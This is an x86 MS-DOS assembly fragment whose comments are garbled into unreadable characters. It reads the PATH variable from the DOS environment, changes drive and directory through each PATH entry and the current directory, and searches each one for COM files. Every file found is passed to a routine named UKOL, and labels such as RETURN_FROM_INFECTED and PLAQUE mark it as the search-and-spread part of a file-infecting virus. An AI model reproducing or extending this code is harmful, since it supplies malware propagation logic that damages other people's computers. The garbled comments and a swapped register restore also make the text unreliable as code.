;**** ����� ������ � ������ ********************************************
;----------------------------
;����:
;DS:SI - ����� ������� ������
;ES:DI - ����� ��� ������
;CX - ���������� ���� ��� ���������
;BX - ����� ������� ������
;�����:
;DI    - �������� � �������� ���� �����, � ��������� ������ 0FFFFH
;----------------------------
CONCATENAT_STRING_IN_MEMORY:
             PUSH AX
             PUSH DX
             CLD
             MOV AL,BYTE PTR DS:[SI] ;������ ������ ������� ������
NEXT_FIND_STRING:
             REPNE SCASB             ;���� ���� ���室�騩 ᨬ���
             JE FOUND_FIRST_CHAR     ;��諨
             MOV DI,0FFFFH           ;��⪠ ⮣�, �� ᨬ��� �� ������
             JMP END_FIND_STRING     ;���

FOUND_FIRST_CHAR:
             PUSH CX
             PUSH DI
             PUSH SI                 ;��࠭��� ⥪�騥 ���祭��
             MOV CX,BX
             DEC DI
             REPE CMPSB              ;�ࠢ���� ��������� ᫮�� � �᪮��

             JE FOUND_STRING         ;�᪮��� ��ப� �������
             POP SI
             POP DI
             POP CX                  ;����⠭����� ⥪�騥 ���祭��

             JMP NEXT_FIND_STRING    ;���� �த��������
FOUND_STRING:
             POP SI                  ;������ �� ����ணࠬ��
             POP DI
             DEC DI

             POP CX
END_FIND_STRING:
             POP AX
             POP DX
             RET


;************* ��������� ������ ������ **************************
FILE_MENAGER:
             LEA SI,PATH
             MOV BX,PATH_LEN  ;����� ��ப� ���᪠
             mov cx,0ffh      ;ࠧ��� ������ ���᪠
             MOV AX,CS:[2CH]
             MOV ES,AX        ;������� ᥣ���� ���㦥��� MSDOS
             XOR DI,DI        ;�᪠�� � ��砫� ᥣ����
             CALL CONCATENAT_STRING_IN_MEMORY  ;�맮� ����ணࠬ�� �����
             CMP DI,0FFFFH    ;������� �� �������?
             JNZ OK_2         ;�������
             JMP NOT_FOUND_2  ;�������� � �ணࠬ��
OK_2:
             XCHG DI,SI       ;���᫠�� ���� ��ப� � SI
             ADD SI,PATH_LEN  ;��३� �� ���� ᨬ��� ��᫥ ��������� ��ப�
             CALL INSPECT_PATH ;�맢��� ��楤��� ��ࠡ�⪨

NOT_FOUND_2:
RET


;************* ����� � ������� �������� *************************
FIND_CURRENT_DIR:
         PUSH ES
         PUSH DS            ;��࠭��� ᥣ����� ॣ�����
         DB 60H             ;��࠭��� ॣ����� ��饣� �����祭��
         PUSH CS
         POP DS             ;����� � ᥣ���� ����
         MOV AH,4EH         ;�㭪�� ���᪠ ��ࢮ�� 䠩��
         MOV CX,20H         ;��᪠ ��ਡ�⮢
         LEA DX,COM_MASK    ;���� ��᪨ 䠩���
INTERRUPT:
         INT 21H
         JC RETURN_FROM_INFECTED ;䠩� �� ������
         CALL UKOL               ;��ࠡ���� 䠩�
         MOV AH,4FH              ;�㭪�� ���᪠ ᫥���饣� 䠩��
         JMP SHORT INTERRUPT
RETURN_FROM_INFECTED:
         DB 61H                  ;������ ॣ�����
         POP DS
         POP ES
NOT_INFECTED:
         RET                     ;��室 �� ����ணࠬ��



;************* ����� �� PATH ************************************
INSPECT_PATH:
    MOV AH,19H
    INT 21H                      ;��।����� ⥪�騩 ��᪮���
    MOV BYTE PTR CS:[DRIVE],AL ;��࠭��� �� ���祭��
    CMP AL,2                     ;�� ���� ���⪨� ���?
    JZ HDD_FIND                  ;��. �஢��� ���� �� PATH
ERROR_PATH:
    RET                          ;��室 �� ����ணࠬ��
HDD_FIND:
    PUSH ES
    POP DS                       ;� DS ᥣ���� ���㦥��� MS DOS
    CALL FIND_CURRENT_DIR        ;�஢��� ��ࠦ���� � ⥪�饬 ��⠫���
LOOP_FIND:
    PUSH ES
    POP DS                       ;� DS ᥣ���� ���㦥��� MS DOS
    MOV AH,19H
    INT 21H                      ;��।����� ⥪�騩 ��᪮���
    MOV DL,BYTE PTR [SI]         ;������� ᨬ��� ��᪮���� �� PATH
    OR DL,00100000B              ;��ॢ��� � ����� ᨬ���
    SUB DL,65                    ;��ॢ��� � ����
    CMP DL,AL                    ;�ࠢ���� ��᪮����
    JZ CHANGE_DIR                ;����� ��⠭����� ���� ��⠫�� ⥪�騬
CHANGE_DRIVE:                    ;�������� ⥪�騩 ��᪮���
    MOV BYTE PTR CS:[DRIVE],DL   ;��������� ����� ���ன�⢮
    MOV AH,0EH
    INT 21H                      ;����� �� ��⠭���� ���ன�⢠ ⥪�騬
CHANGE_DIR:
    LEA BX,CPATH                 ;��⠭����� ��砫� ����� ��⠫���
LOOP_ZERRO_PATH:
    MOV DL,BYTE PTR [SI]         ;������� ᨬ��� �� ����� ��⠫���
    CMP DL,0H                    ;�� ��᫥���� ᨬ��� PATH?
    JZ ERROR_PATH                ;��. �������� ���� ��⠫����
    CMP DL,';'                   ;�� ��᫥���� ᨬ��� � ����� ��⠫���?
    JNZ NEXT_SYM                 ;���
    MOV DL,0H                    ;��. ᤥ���� ��� �㫥��
NEXT_SYM:
    MOV BYTE PTR CS:[BX],DL      ;��࠭��� ᨬ��� ����� ��⠫���
    INC SI                       ;㢥����� ���稪 ���筨��
    INC BX                       ;㢥����� ���稪 �ਥ�����
    CMP DL,0H                    ;�� ��᫥���� ᨬ��� �����?
    JZ END_PATH                  ;��. �������� ����㫨஢����
    JMP LOOP_ZERRO_PATH          ;�� ��諨. ����� ᫥��騩 ᨬ���
END_PATH:
    MOV AH,3BH
    PUSH CS
    POP DS
    LEA DX,CPATH
    INT 21H                      ;��⠭����� ��⠫�� ⥪�騬
    CMP AX,0                     ;��� �訡��?
    JZ PLAQUE                    ;��३� � �����
    JMP LOOP_FIND                ;��⠫�� ������㯥�. ���� ᫥��饣�
PLAQUE:
    CALL FIND_CURRENT_DIR        ;���� 䠩��� � ��⠫���
    JMP LOOP_FIND                ;���� ᫥��饣� ��⠫���
